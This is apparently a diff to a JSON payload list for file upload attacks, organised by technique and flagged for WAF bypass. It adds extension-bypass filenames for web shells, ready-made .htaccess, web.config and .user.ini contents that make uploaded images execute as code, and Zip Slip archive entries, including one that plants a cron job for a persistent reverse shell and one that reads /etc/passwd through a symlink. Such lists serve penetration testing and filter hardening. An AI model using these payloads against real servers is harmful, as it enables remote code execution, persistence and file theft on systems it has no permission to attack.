@@ -15,7 +15,12 @@
         {"payload": "shell.php%20", "description": "Trailing space — some systems strip whitespace after saving", "waf_bypass": true},
         {"payload": "shell.shtml", "description": "Server-Side Include extension — executes SSI directives", "waf_bypass": true},
         {"payload": "shell.jsp.png", "description": "Double extension for Java servers", "waf_bypass": false},
-        {"payload": "shell.aspx;.jpg", "description": "Semicolon extension bypass for ASP.NET/IIS", "waf_bypass": true}
+        {"payload": "shell.aspx;.jpg", "description": "Semicolon extension bypass for ASP.NET/IIS", "waf_bypass": true},
+        {"payload": "shell.php7", "description": "PHP 7 extension — often missing from blacklists", "waf_bypass": true},
+        {"payload": "shell.php8", "description": "PHP 8 extension — newer extension not in legacy blacklists", "waf_bypass": true},
+        {"payload": "shell.phar", "description": "PHP archive extension — executable via phar:// stream wrapper", "waf_bypass": true},
+        {"payload": "shell.cgi", "description": "CGI extension — executes if CGI is enabled in server config", "waf_bypass": true},
+        {"payload": "shell.shtml", "description": "SSI extension — Server-Side Includes can execute commands via <!--#exec -->", "waf_bypass": true}
       ]
     },
     "content_type_bypass": {
@@ -77,6 +82,25 @@
         {"payload": "shell.hbs", "description": "Upload Handlebars template", "waf_bypass": false},
         {"payload": "shell.pug", "description": "Upload Pug/Jade template", "waf_bypass": false},
         {"payload": "__proto__.json", "description": "Prototype pollution via filename", "waf_bypass": true}
+      ]
+    },
+    "server_config": {
+      "description": "Server configuration file upload attacks — overwrite or create config files to gain code execution",
+      "payloads": [
+        {"payload": ".htaccess\n\nAddType application/x-httpd-php .jpg", "description": "Apache .htaccess — makes .jpg files execute as PHP, then upload shell.jpg", "waf_bypass": false},
+        {"payload": "web.config\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><configuration><system.webServer><handlers><add name=\"x\" path=\"*.jpg\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\System32\\inetsrv\\asp.dll\" /></handlers></system.webServer></configuration>", "description": "IIS web.config — registers custom handler to execute .jpg as ASP", "waf_bypass": false},
+        {"payload": ".user.ini\n\nauto_prepend_file=shell.jpg", "description": "PHP .user.ini — auto-includes shell.jpg before every PHP file in the directory", "waf_bypass": false},
+        {"payload": "crossdomain.xml\n\n<?xml version=\"1.0\"?><cross-domain-policy><allow-access-from domain=\"*\"/></cross-domain-policy>", "description": "Flash crossdomain.xml — allows any domain to read responses (CORS bypass for legacy Flash)", "waf_bypass": false},
+        {"payload": ".php.ini\n\nauto_prepend_file=/tmp/shell", "description": "PHP ini override — auto-prepends malicious file before every PHP execution in directory", "waf_bypass": false}
+      ]
+    },
+    "archive_attack": {
+      "description": "Archive-based file upload attacks — zip slip, symlink traversal, and path manipulation in compressed files",
+      "payloads": [
+        {"payload": "../../../../../../tmp/shell.php (as ZIP entry filename)", "description": "Zip Slip — path traversal in archive entry filename writes file outside extraction directory", "waf_bypass": false},
+        {"payload": "symlink -> /etc/passwd (as tar entry)", "description": "Symlink in tar/zip — archive contains symlink pointing to sensitive file, extraction follows link", "waf_bypass": false},
+        {"payload": "../../etc/cron.d/reverse-shell (as ZIP entry filename)", "description": "Zip Slip to cron — writes cron job for persistent reverse shell via archive extraction", "waf_bypass": false},
+        {"payload": "....//....//....//tmp/shell.php (as ZIP entry filename)", "description": "Double-dot-slash Zip Slip — alternative traversal syntax that bypasses single ../ stripping", "waf_bypass": true}
       ]
     }
   }
